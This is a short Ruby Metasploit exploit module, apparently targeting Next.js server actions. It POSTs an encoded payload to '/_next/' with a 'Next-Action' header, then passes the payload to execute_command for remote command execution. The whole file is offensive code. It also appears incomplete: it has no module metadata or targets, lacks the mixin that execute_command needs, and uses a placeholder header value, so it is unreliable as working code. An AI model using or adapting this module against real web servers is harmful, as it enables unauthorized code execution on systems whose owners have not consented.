class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  def exploit
    send_request_cgi('uri' => '/_next/', 'method' => 'POST', 'headers' => {'Next-Action' => 'x'}, 'data' => payload.encoded)
    execute_command(payload.encoded)
  end
end
